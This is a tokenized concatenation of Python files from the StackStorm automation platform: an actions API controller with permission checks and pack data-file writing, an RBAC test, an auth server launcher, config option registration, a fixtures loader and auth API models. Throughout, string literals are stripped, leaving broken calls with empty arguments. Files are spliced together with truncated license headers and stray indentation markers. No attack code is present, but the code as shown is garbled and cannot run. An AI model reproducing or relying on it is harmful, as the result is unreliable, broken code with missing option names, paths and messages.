def __init__ ( self , * args , ** kwargs ) : \n 
~~~ super ( ActionsController , self ) . __init__ ( * args , ** kwargs ) \n 
self . _trigger_dispatcher = TriggerDispatcher ( LOG ) \n 
\n 
~~ @ request_user_has_permission ( permission_type = PermissionType . ACTION_LIST ) \n 
@ jsexpose ( ) \n 
def get_all ( self , ** kwargs ) : \n 
~~~ return super ( ActionsController , self ) . _get_all ( ** kwargs ) \n 
\n 
~~ @ request_user_has_resource_db_permission ( permission_type = PermissionType . ACTION_VIEW ) \n 
@ jsexpose ( arg_types = [ str ] ) \n 
def get_one ( self , ref_or_id ) : \n 
~~~ return super ( ActionsController , self ) . _get_one ( ref_or_id ) \n 
\n 
~~ @ jsexpose ( body_cls = ActionCreateAPI , status_code = http_client . CREATED ) \n 
@ request_user_has_resource_api_permission ( permission_type = PermissionType . ACTION_CREATE ) \n 
def post ( self , action ) : \n 
~~~ """\n            Create a new action.\n\n            Handles requests:\n                POST /actions/\n        """ \n 
\n 
try : \n 
# Perform validation \n 
~~~ validate_not_part_of_system_pack ( action ) \n 
action_validator . validate_action ( action ) \n 
~~ except ( ValidationError , ValueError , \n 
ValueValidationException , InvalidActionParameterException ) as e : \n 
~~~ LOG . exception ( , action ) \n 
abort ( http_client . BAD_REQUEST , str ( e ) ) \n 
return \n 
\n 
# Write pack data files to disk (if any are provided) \n 
~~ data_files = getattr ( action , , [ ] ) \n 
written_data_files = [ ] \n 
if data_files : \n 
~~~ written_data_files = self . _handle_data_files ( pack_name = action . pack , \n 
data_files = data_files ) \n 
\n 
~~ action_model = ActionAPI . to_model ( action ) \n 
\n 
LOG . debug ( , action ) \n 
action_db = Action . add_or_update ( action_model ) \n 
LOG . debug ( , action_db ) \n 
\n 
# Dispatch an internal trigger for each written data file. This way user \n 
# automate comitting this files to git using StackStorm rule \n 
if written_data_files : \n 
~~~ self . _dispatch_trigger_for_written_data_files ( action_db = action_db , \n 
written_data_files = written_data_files ) \n 
\n 
~~ extra = { : action_db } \n 
LOG . audit ( % ( action_db . id ) , extra = extra ) \n 
action_api = ActionAPI . from_model ( action_db ) \n 
\n 
return action_api \n 
\n 
~~ @ request_user_has_resource_db_permission ( permission_type = PermissionType . ACTION_MODIFY ) \n 
@ jsexpose ( arg_types = [ str ] , body_cls = ActionCreateAPI ) \n 
def put ( self , action_ref_or_id , action ) : \n 
~~~ action_db = self . _get_by_ref_or_id ( ref_or_id = action_ref_or_id ) \n 
\n 
# Assert permissions \n 
action_id = action_db . id \n 
\n 
if not getattr ( action , , None ) : \n 
~~~ action . pack = action_db . pack \n 
\n 
# Perform validation \n 
~~ validate_not_part_of_system_pack ( action ) \n 
action_validator . validate_action ( action ) \n 
\n 
# Write pack data files to disk (if any are provided) \n 
data_files = getattr ( action , , [ ] ) \n 
written_data_files = [ ] \n 
if data_files : \n 
~~~ written_data_files = self . _handle_data_files ( pack_name = action . pack , \n 
data_files = data_files ) \n 
\n 
~~ try : \n 
~~~ action_db = ActionAPI . to_model ( action ) \n 
LOG . debug ( , action_db ) \n 
action_db . id = action_id \n 
action_db = Action . add_or_update ( action_db ) \n 
LOG . debug ( , action_db ) \n 
~~ except ( ValidationError , ValueError ) as e : \n 
~~~ LOG . exception ( , action ) \n 
abort ( http_client . BAD_REQUEST , str ( e ) ) \n 
return \n 
\n 
# Dispatch an internal trigger for each written data file. This way user \n 
# automate comitting this files to git using StackStorm rule \n 
~~ if written_data_files : \n 
~~~ self . _dispatch_trigger_for_written_data_files ( action_db = action_db , \n 
written_data_files = written_data_files ) \n 
\n 
~~ action_api = ActionAPI . from_model ( action_db ) \n 
LOG . debug ( , action_api ) \n 
\n 
return action_api \n 
\n 
~~ @ request_user_has_resource_db_permission ( permission_type = PermissionType . ACTION_DELETE ) \n 
@ jsexpose ( arg_types = [ str ] , status_code = http_client . NO_CONTENT ) \n 
def delete ( self , action_ref_or_id ) : \n 
~~~ """\n            Delete an action.\n\n            Handles requests:\n                POST /actions/1?_method=delete\n                DELETE /actions/1\n                DELETE /actions/mypack.myaction\n        """ \n 
action_db = self . _get_by_ref_or_id ( ref_or_id = action_ref_or_id ) \n 
action_id = action_db . id \n 
\n 
try : \n 
~~~ validate_not_part_of_system_pack ( action_db ) \n 
~~ except ValueValidationException as e : \n 
~~~ abort ( http_client . BAD_REQUEST , str ( e ) ) \n 
\n 
~~ LOG . debug ( , \n 
action_ref_or_id , action_db ) \n 
\n 
try : \n 
~~~ Action . delete ( action_db ) \n 
~~ except Exception as e : \n 
~~~ LOG . error ( \'Database delete encountered exception during delete of id="%s". \' \n 
, action_id , e ) \n 
abort ( http_client . INTERNAL_SERVER_ERROR , str ( e ) ) \n 
return \n 
\n 
~~ extra = { : action_db } \n 
LOG . audit ( % ( action_db . id ) , extra = extra ) \n 
return None \n 
\n 
~~ def _handle_data_files ( self , pack_name , data_files ) : \n 
~~~ """\n        Method for handling action data files.\n\n        This method performs two tasks:\n\n        1. Writes files to disk\n        2. Updates affected PackDB model\n        """ \n 
# Write files to disk \n 
written_file_paths = self . _write_data_files_to_disk ( pack_name = pack_name , \n 
data_files = data_files ) \n 
\n 
# Update affected PackDB model (update a list of files) \n 
# Update PackDB \n 
self . _update_pack_model ( pack_name = pack_name , data_files = data_files , \n 
written_file_paths = written_file_paths ) \n 
\n 
return written_file_paths \n 
\n 
~~ def _write_data_files_to_disk ( self , pack_name , data_files ) : \n 
~~~ """\n        Write files to disk.\n        """ \n 
written_file_paths = [ ] \n 
\n 
for data_file in data_files : \n 
~~~ file_path = data_file [ ] \n 
content = data_file [ ] \n 
\n 
file_path = get_pack_resource_file_abs_path ( pack_name = pack_name , \n 
resource_type = , \n 
file_path = file_path ) \n 
\n 
LOG . debug ( \'Writing data file "%s" to "%s"\' % ( str ( data_file ) , file_path ) ) \n 
self . _write_data_file ( pack_name = pack_name , file_path = file_path , content = content ) \n 
written_file_paths . append ( file_path ) \n 
\n 
~~ return written_file_paths \n 
\n 
~~ def _update_pack_model ( self , pack_name , data_files , written_file_paths ) : \n 
~~~ """\n        Update PackDB models (update files list).\n        """ \n 
file_paths = [ ] # A list of paths relative to the pack directory for new files \n 
for file_path in written_file_paths : \n 
~~~ file_path = get_relative_path_to_pack ( pack_name = pack_name , file_path = file_path ) \n 
file_paths . append ( file_path ) \n 
\n 
~~ pack_db = Pack . get_by_ref ( pack_name ) \n 
pack_db . files = set ( pack_db . files ) \n 
pack_db . files . update ( set ( file_paths ) ) \n 
pack_db . files = list ( pack_db . files ) \n 
pack_db = Pack . add_or_update ( pack_db ) \n 
\n 
return pack_db \n 
\n 
~~ def _write_data_file ( self , pack_name , file_path , content ) : \n 
~~~ """\n        Write data file on disk.\n        """ \n 
\n 
pack_base_path = get_pack_base_path ( pack_name = pack_name ) \n 
if not os . path . isdir ( pack_base_path ) : \n 
~~~ raise ValueError ( \'Directory for pack "%s" doesn\\\'t exist\' % ( pack_name ) ) \n 
\n 
\n 
~~ directory = os . path . dirname ( file_path ) \n 
\n 
if not os . path . isdir ( directory ) : \n 
~~~ os . makedirs ( directory ) \n 
\n 
~~ with open ( file_path , ) as fp : \n 
~~~ fp . write ( content ) \n 
\n 
~~ ~~ def _dispatch_trigger_for_written_data_files ( self , action_db , written_data_files ) : \n 
~~~ trigger = ACTION_FILE_WRITTEN_TRIGGER [ ] \n 
host_info = get_host_info ( ) \n 
\n 
for file_path in written_data_files : \n 
~~~ payload = { \n 
: action_db . ref , \n 
: file_path , \n 
: host_info \n 
} \n 
self . _trigger_dispatcher . dispatch ( trigger = trigger , payload = payload ) \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ ~~ import httplib \n 
\n 
import mock \n 
import six \n 
\n 
import st2common . validators . api . action as action_validator \n 
from st2common . rbac . types import PermissionType \n 
from st2common . rbac . types import ResourceType \n 
from st2common . persistence . auth import User \n 
from st2common . persistence . rbac import Role \n 
from st2common . persistence . rbac import UserRoleAssignment \n 
from st2common . persistence . rbac import PermissionGrant \n 
from st2common . models . db . auth import UserDB \n 
from st2common . models . db . rbac import RoleDB \n 
from st2common . models . db . rbac import UserRoleAssignmentDB \n 
from st2common . models . db . rbac import PermissionGrantDB \n 
from st2tests . fixturesloader import FixturesLoader \n 
from tests . base import APIControllerWithRBACTestCase \n 
\n 
http_client = six . moves . http_client \n 
\n 
__all__ = [ \n 
\n 
] \n 
\n 
FIXTURES_PACK = \n 
TEST_FIXTURES = { \n 
: [ ] , \n 
: [ , ] , \n 
} \n 
\n 
ACTION_2 = { \n 
: , \n 
: , \n 
: , \n 
: True , \n 
: , \n 
: , \n 
: { \n 
: { : , : , : 0 } , \n 
: { : , : , : True } \n 
} \n 
} \n 
\n 
\n 
class ActionControllerRBACTestCase ( APIControllerWithRBACTestCase ) : \n 
~~~ fixtures_loader = FixturesLoader ( ) \n 
\n 
def setUp ( self ) : \n 
~~~ super ( ActionControllerRBACTestCase , self ) . setUp ( ) \n 
self . fixtures_loader . save_fixtures_to_db ( fixtures_pack = FIXTURES_PACK , \n 
fixtures_dict = TEST_FIXTURES ) \n 
\n 
file_name = \n 
ActionControllerRBACTestCase . ACTION_1 = self . fixtures_loader . load_fixtures ( \n 
fixtures_pack = FIXTURES_PACK , \n 
fixtures_dict = { : [ file_name ] } ) [ ] [ file_name ] \n 
\n 
# Insert mock users, roles and assignments \n 
self = self \n 
self . users = { } \n 
self . roles = { } \n 
\n 
# Users \n 
user_1_db = UserDB ( name = ) \n 
user_1_db = User . add_or_update ( user_1_db ) \n 
self . users [ ] = user_1_db \n 
\n 
user_2_db = UserDB ( name = ) \n 
user_2_db = User . add_or_update ( user_2_db ) \n 
self . users [ ] = user_2_db \n 
\n 
# Roles \n 
# action_create grant on parent pack \n 
grant_db = PermissionGrantDB ( resource_uid = , \n 
resource_type = ResourceType . PACK , \n 
permission_types = [ PermissionType . ACTION_CREATE ] ) \n 
grant_db = PermissionGrant . add_or_update ( grant_db ) \n 
permission_grants = [ str ( grant_db . id ) ] \n 
role_1_db = RoleDB ( name = , permission_grants = permission_grants ) \n 
role_1_db = Role . add_or_update ( role_1_db ) \n 
self . roles [ ] = role_1_db \n 
\n 
# Role assignments \n 
user_db = self . users [ ] \n 
role_assignment_db = UserRoleAssignmentDB ( \n 
user = user_db . name , \n 
role = self . roles [ ] . name ) \n 
UserRoleAssignment . add_or_update ( role_assignment_db ) \n 
\n 
~~ def test_create_action_no_action_create_permission ( self ) : \n 
~~~ user_db = self . users [ ] \n 
self . use_user ( user_db ) \n 
\n 
resp = self . __do_post ( ActionControllerRBACTestCase . ACTION_1 ) \n 
expected_msg = ( \'User "no_permissions" doesn\\\'t have required permission "action_create" \' \n 
\'on resource "action:wolfpack:action-1"\' ) \n 
self . assertEqual ( resp . status_code , httplib . FORBIDDEN ) \n 
self . assertEqual ( resp . json [ ] , expected_msg ) \n 
self . use_user ( { } ) \n 
\n 
~~ @ mock . patch . object ( action_validator , , mock . MagicMock ( \n 
return_value = True ) ) \n 
def test_create_action_success ( self ) : \n 
~~~ user_db = self . users [ ] \n 
self . use_user ( user_db ) \n 
\n 
resp = self . __do_post ( ACTION_2 ) \n 
self . assertEqual ( resp . status_code , httplib . CREATED ) \n 
\n 
~~ @ staticmethod \n 
def __get_action_id ( resp ) : \n 
~~~ return resp . json [ ] \n 
\n 
~~ def __do_post ( self , rule ) : \n 
~~~ return self . app . post_json ( , rule , expect_errors = True ) \n 
\n 
~~ def __do_delete ( self , action_id , expect_errors = False ) : \n 
~~~ return self . app . delete ( % action_id , expect_errors = expect_errors ) \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ import eventlet \n 
import os \n 
import sys \n 
\n 
from oslo_config import cfg \n 
from eventlet import wsgi \n 
\n 
from st2common import log as logging \n 
from st2common . service_setup import setup as common_setup \n 
from st2common . service_setup import teardown as common_teardown \n 
from st2common . util . monkey_patch import monkey_patch \n 
from st2common . constants . auth import VALID_MODES \n 
from st2auth import config \n 
config . register_opts ( ) \n 
from st2auth import app \n 
\n 
__all__ = [ \n 
\n 
] \n 
\n 
monkey_patch ( ) \n 
\n 
LOG = logging . getLogger ( __name__ ) \n 
\n 
\n 
def _setup ( ) : \n 
~~~ common_setup ( service = , config = config , setup_db = True , register_mq_exchanges = False , \n 
register_signal_handlers = True , register_internal_trigger_types = False , \n 
run_migrations = False ) \n 
\n 
if cfg . CONF . auth . mode not in VALID_MODES : \n 
~~~ raise ValueError ( % ( . join ( VALID_MODES ) ) ) \n 
\n 
\n 
~~ ~~ def _run_server ( ) : \n 
~~~ host = cfg . CONF . auth . host \n 
port = cfg . CONF . auth . port \n 
use_ssl = cfg . CONF . auth . use_ssl \n 
\n 
cert_file_path = os . path . realpath ( cfg . CONF . auth . cert ) \n 
key_file_path = os . path . realpath ( cfg . CONF . auth . key ) \n 
\n 
if use_ssl and not os . path . isfile ( cert_file_path ) : \n 
~~~ raise ValueError ( \'Certificate file "%s" doesn\\\'t exist\' % ( cert_file_path ) ) \n 
\n 
~~ if use_ssl and not os . path . isfile ( key_file_path ) : \n 
~~~ raise ValueError ( \'Private key file "%s" doesn\\\'t exist\' % ( key_file_path ) ) \n 
\n 
~~ socket = eventlet . listen ( ( host , port ) ) \n 
\n 
if use_ssl : \n 
~~~ socket = eventlet . wrap_ssl ( socket , \n 
certfile = cert_file_path , \n 
keyfile = key_file_path , \n 
server_side = True ) \n 
\n 
~~ LOG . info ( \'ST2 Auth API running in "%s" auth mode\' , cfg . CONF . auth . mode ) \n 
LOG . info ( , os . getpid ( ) , \n 
if use_ssl else , host , port ) \n 
\n 
wsgi . server ( socket , app . setup_app ( ) ) \n 
return 0 \n 
\n 
\n 
~~ def _teardown ( ) : \n 
~~~ common_teardown ( ) \n 
\n 
\n 
~~ def main ( ) : \n 
~~~ try : \n 
~~~ _setup ( ) \n 
return _run_server ( ) \n 
~~ except SystemExit as exit_code : \n 
~~~ sys . exit ( exit_code ) \n 
~~ except Exception : \n 
~~~ LOG . exception ( , os . getpid ( ) ) \n 
return 1 \n 
~~ finally : \n 
~~~ _teardown ( ) \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ __all__ = [ \n 
, \n 
\n 
] \n 
\n 
# Stores parsed config dictionary \n 
CONFIG = { } \n 
\n 
\n 
def get_config ( ) : \n 
~~~ """\n    Retrieve parsed config object.\n\n    :rtype: ``dict``\n    """ \n 
global CONFIG \n 
return CONFIG \n 
\n 
\n 
~~ def set_config ( config ) : \n 
~~~ """\n    Store parsing config object.\n\n    :type config: ``dict``\n\n    :rtype: ``dict``\n    """ \n 
global CONFIG \n 
CONFIG = config \n 
return config \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ try : \n 
~~~ import simplejson as json \n 
~~ except ImportError : \n 
~~~ import json \n 
\n 
~~ import os \n 
import six \n 
import yaml \n 
\n 
\n 
ALLOWED_EXTS = [ , , , ] \n 
PARSER_FUNCS = { : json . load , : yaml . safe_load , : yaml . safe_load } \n 
\n 
\n 
def get_fixtures_base_path ( ) : \n 
~~~ return os . path . dirname ( __file__ ) \n 
\n 
\n 
~~ def load_content ( file_path ) : \n 
~~~ """\n    Loads content from file_path if file_path\'s extension\n    is one of allowed ones (See ALLOWED_EXTS).\n    Throws UnsupportedMetaException on disallowed filetypes.\n    :param file_path: Absolute path to the file to load content from.\n    :type file_path: ``str``\n    :rtype: ``dict``\n    """ \n 
file_name , file_ext = os . path . splitext ( file_path ) \n 
\n 
if file_ext not in ALLOWED_EXTS : \n 
~~~ raise Exception ( % \n 
( file_ext , file_path , ALLOWED_EXTS ) ) \n 
\n 
~~ parser_func = PARSER_FUNCS . get ( file_ext , None ) \n 
\n 
with open ( file_path , ) as fd : \n 
~~~ return parser_func ( fd ) if parser_func else fd . read ( ) \n 
\n 
\n 
~~ ~~ def load_fixtures ( fixtures_dict = None ) : \n 
~~~ """\n    Loads fixtures specified in fixtures_dict. This method must be\n    used for fixtures that don\'t have associated data models. We\n    simply want to load the meta into dict objects.\n    fixtures_dict should be of the form:\n    {\n        \'actionchains\': [\'actionchain1.json\', \'actionchain2.json\'],\n        \'workflows\': [\'workflow.yaml\']\n    }\n    :param fixtures_dict: Dictionary specifying the fixtures to load for each type.\n    :type fixtures_dict: ``dict``\n    :rtype: ``dict``\n    """ \n 
if fixtures_dict is None : \n 
~~~ fixtures_dict = { } \n 
\n 
~~ all_fixtures = { } \n 
fixtures_base_path = get_fixtures_base_path ( ) \n 
for fixture_type , fixtures in six . iteritems ( fixtures_dict ) : \n 
~~~ loaded_fixtures = { } \n 
for fixture in fixtures : \n 
~~~ fixture_path = fixtures_base_path + + fixture \n 
fixture_dict = load_content ( fixture_path ) \n 
loaded_fixtures [ fixture ] = fixture_dict \n 
~~ all_fixtures [ fixture_type ] = loaded_fixtures \n 
\n 
~~ return all_fixtures \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ import os \n 
import sys \n 
\n 
from oslo_config import cfg \n 
\n 
from st2common . constants . system import VERSION_STRING \n 
\n 
\n 
def do_register_opts ( opts , group = None , ignore_errors = False ) : \n 
~~~ try : \n 
~~~ cfg . CONF . register_opts ( opts , group = group ) \n 
~~ except : \n 
~~~ if not ignore_errors : \n 
~~~ raise \n 
\n 
\n 
~~ ~~ ~~ def do_register_cli_opts ( opt , ignore_errors = False ) : \n 
# TODO: This function has broken name, it should work with lists :/ \n 
~~~ if not isinstance ( opt , ( list , tuple ) ) : \n 
~~~ opts = [ opt ] \n 
~~ else : \n 
~~~ opts = opt \n 
\n 
~~ try : \n 
~~~ cfg . CONF . register_cli_opts ( opts ) \n 
~~ except : \n 
~~~ if not ignore_errors : \n 
~~~ raise \n 
\n 
\n 
~~ ~~ ~~ def register_opts ( ignore_errors = False ) : \n 
~~~ rbac_opts = [ \n 
cfg . BoolOpt ( , default = False , help = ) , \n 
] \n 
do_register_opts ( rbac_opts , , ignore_errors ) \n 
\n 
system_user_opts = [ \n 
cfg . StrOpt ( , \n 
default = , \n 
help = ) , \n 
cfg . StrOpt ( , \n 
default = , \n 
help = ) \n 
] \n 
do_register_opts ( system_user_opts , , ignore_errors ) \n 
\n 
schema_opts = [ \n 
cfg . IntOpt ( , default = 4 , help = ) , \n 
cfg . StrOpt ( , default = , \n 
help = ) \n 
] \n 
do_register_opts ( schema_opts , , ignore_errors ) \n 
\n 
system_opts = [ \n 
cfg . StrOpt ( , default = , \n 
help = ) \n 
] \n 
do_register_opts ( system_opts , , ignore_errors ) \n 
\n 
system_packs_base_path = os . path . join ( cfg . CONF . system . base_path , ) \n 
content_opts = [ \n 
cfg . StrOpt ( , default = system_packs_base_path , \n 
help = ) , \n 
cfg . StrOpt ( , default = None , \n 
help = ) \n 
] \n 
do_register_opts ( content_opts , , ignore_errors ) \n 
\n 
db_opts = [ \n 
cfg . StrOpt ( , default = , help = ) , \n 
cfg . IntOpt ( , default = 27017 , help = ) , \n 
cfg . StrOpt ( , default = , help = ) , \n 
cfg . StrOpt ( , help = ) , \n 
cfg . StrOpt ( , help = ) , \n 
cfg . IntOpt ( , help = , \n 
default = 3 ) , \n 
cfg . IntOpt ( , help = , default = 10 ) , \n 
cfg . IntOpt ( , help = , \n 
default = 1 ) , \n 
cfg . BoolOpt ( , help = , default = False ) , \n 
cfg . StrOpt ( , \n 
help = , \n 
default = None ) , \n 
cfg . StrOpt ( , help = , \n 
default = None ) , \n 
cfg . StrOpt ( , choices = , \n 
help = , \n 
default = None ) , \n 
cfg . StrOpt ( , \n 
help = , \n 
default = None ) , \n 
cfg . BoolOpt ( , \n 
help = , \n 
default = True ) \n 
] \n 
do_register_opts ( db_opts , , ignore_errors ) \n 
\n 
messaging_opts = [ \n 
# It would be nice to be able to deprecate url and completely switch to using \n 
# url. However, this will be a breaking change and will have impact so allowing both. \n 
cfg . StrOpt ( , default = , \n 
help = ) , \n 
cfg . ListOpt ( , default = [ ] , \n 
help = ) \n 
] \n 
do_register_opts ( messaging_opts , , ignore_errors ) \n 
\n 
syslog_opts = [ \n 
cfg . StrOpt ( , default = , \n 
help = ) , \n 
cfg . IntOpt ( , default = 514 , \n 
help = ) , \n 
cfg . StrOpt ( , default = , \n 
help = ) , \n 
cfg . StrOpt ( , default = , \n 
help = ) \n 
] \n 
do_register_opts ( syslog_opts , , ignore_errors ) \n 
\n 
log_opts = [ \n 
cfg . ListOpt ( , default = , \n 
help = ) , \n 
cfg . BoolOpt ( , default = False , \n 
help = ) , \n 
cfg . BoolOpt ( , default = True , \n 
help = ) \n 
] \n 
do_register_opts ( log_opts , , ignore_errors ) \n 
\n 
# Common API options \n 
api_opts = [ \n 
cfg . StrOpt ( , default = , help = ) , \n 
cfg . IntOpt ( , default = 9101 , help = ) , \n 
cfg . ListOpt ( , default = [ ] , \n 
help = ) , \n 
cfg . BoolOpt ( , default = True , \n 
help = ) \n 
] \n 
do_register_opts ( api_opts , , ignore_errors ) \n 
\n 
# Key Value store options \n 
keyvalue_opts = [ \n 
cfg . BoolOpt ( , default = True , \n 
help = \'Allow encryption of values in key value stored qualified as "secret".\' ) , \n 
cfg . StrOpt ( , default = , \n 
help = + \n 
+ \n 
) \n 
] \n 
do_register_opts ( keyvalue_opts , group = ) \n 
\n 
# Common auth options \n 
auth_opts = [ \n 
cfg . StrOpt ( , default = None , \n 
help = ) , \n 
cfg . BoolOpt ( , default = True , help = ) , \n 
cfg . IntOpt ( , default = 86400 , help = ) \n 
] \n 
do_register_opts ( auth_opts , , ignore_errors ) \n 
\n 
# Common action runner options \n 
default_python_bin_path = sys . executable \n 
base_dir = os . path . dirname ( os . path . realpath ( default_python_bin_path ) ) \n 
default_virtualenv_bin_path = os . path . join ( base_dir , ) \n 
action_runner_opts = [ \n 
cfg . StrOpt ( , default = , \n 
help = ) , \n 
cfg . StrOpt ( , default = default_python_bin_path , \n 
help = ) , \n 
cfg . StrOpt ( , default = default_virtualenv_bin_path , \n 
help = ) , \n 
cfg . ListOpt ( , default = [ ] , \n 
help = \'List of virtualenv options to be passsed to "virtualenv" command that \' + \n 
) \n 
] \n 
do_register_opts ( action_runner_opts , group = ) \n 
\n 
# Common options (used by action runner and sensor container) \n 
action_sensor_opts = [ \n 
cfg . BoolOpt ( , default = True , \n 
help = ) , \n 
] \n 
do_register_opts ( action_sensor_opts , group = ) \n 
\n 
# Coordination options \n 
coord_opts = [ \n 
cfg . StrOpt ( , default = None , help = ) , \n 
cfg . IntOpt ( , default = 60 , help = ) \n 
] \n 
do_register_opts ( coord_opts , , ignore_errors ) \n 
\n 
# Mistral options \n 
mistral_opts = [ \n 
cfg . StrOpt ( , default = , help = ) , cfg . IntOpt ( , default = 1000 , help = ) , \n 
cfg . IntOpt ( , default = 300000 , help = ) , \n 
cfg . IntOpt ( , default = 600000 , help = ) , \n 
cfg . StrOpt ( , default = None , help = ) , \n 
cfg . StrOpt ( , default = None , help = ) , \n 
cfg . StrOpt ( , default = None , help = ) , \n 
cfg . StrOpt ( , default = None , help = ) , \n 
cfg . StrOpt ( , default = None , help = ) , \n 
cfg . BoolOpt ( , default = False , help = ) , \n 
\n 
cfg . StrOpt ( , default = None , help = ( \n 
\n 
) ) \n 
] \n 
do_register_opts ( mistral_opts , group = , ignore_errors = ignore_errors ) \n 
\n 
# Common CLI options \n 
debug = cfg . BoolOpt ( , default = False , \n 
help = ) \n 
profile = cfg . BoolOpt ( , default = False , \n 
help = ( \n 
) ) \n 
use_debugger = cfg . BoolOpt ( , default = True , \n 
help = \n 
\n 
) \n 
\n 
cli_opts = [ debug , profile , use_debugger ] \n 
do_register_cli_opts ( cli_opts , ignore_errors = ignore_errors ) \n 
\n 
\n 
~~ def parse_args ( args = None ) : \n 
~~~ register_opts ( ) \n 
cfg . CONF ( args = args , version = VERSION_STRING ) \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ from st2common . exceptions import StackStormBaseException \n 
\n 
__all__ = [ \n 
] \n 
\n 
\n 
class InternalServerErrorException ( StackStormBaseException ) : \n 
~~~ pass \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ import six \n 
\n 
from oslo_config import cfg \n 
from st2common . util import isotime \n 
from st2common . models . api . base import BaseAPI \n 
from st2common . models . db . auth import UserDB , TokenDB , ApiKeyDB \n 
from st2common import log as logging \n 
\n 
\n 
LOG = logging . getLogger ( __name__ ) \n 
\n 
\n 
def get_system_username ( ) : \n 
~~~ return cfg . CONF . system_user . user \n 
\n 
\n 
~~ class UserAPI ( BaseAPI ) : \n 
~~~ model = UserDB \n 
schema = { \n 
"title" : "User" , \n 
"type" : "object" , \n 
"properties" : { \n 
"name" : { \n 
"type" : "string" , \n 
"required" : True \n 
} \n 
} , \n 
"additionalProperties" : False \n 
} \n 
\n 
@ classmethod \n 
def to_model ( cls , user ) : \n 
~~~ name = user . name \n 
model = cls . model ( name = name ) \n 
return model \n 
\n 
\n 
~~ ~~ class TokenAPI ( BaseAPI ) : \n 
~~~ model = TokenDB \n 
schema = { \n 
"title" : "Token" , \n 
"type" : "object" , \n 
"properties" : { \n 
"id" : { \n 
"type" : "string" \n 
} , \n 
"user" : { \n 
"type" : [ "string" , "null" ] \n 
} , \n 
"token" : { \n 
"type" : [ "string" , "null" ] \n 
} , \n 
"ttl" : { \n 
"type" : "integer" , \n 
"minimum" : 1 \n 
} , \n 
"expiry" : { \n 
"type" : [ "string" , "null" ] , \n 
"pattern" : isotime . ISO8601_UTC_REGEX \n 
} , \n 
"metadata" : { \n 
"type" : [ "object" , "null" ] \n 
} \n 
} , \n 
"additionalProperties" : False \n 
} \n 
\n 
@ classmethod \n 
def from_model ( cls , model , mask_secrets = False ) : \n 
~~~ doc = super ( cls , cls ) . _from_model ( model , mask_secrets = mask_secrets ) \n 
doc [ ] = isotime . format ( model . expiry , offset = False ) if model . expiry else None \n 
return cls ( ** doc ) \n 
\n 
~~ @ classmethod \n 
def to_model ( cls , instance ) : \n 
~~~ user = str ( instance . user ) if instance . user else None \n 
token = str ( instance . token ) if instance . token else None \n 
expiry = isotime . parse ( instance . expiry ) if instance . expiry else None \n 
\n 
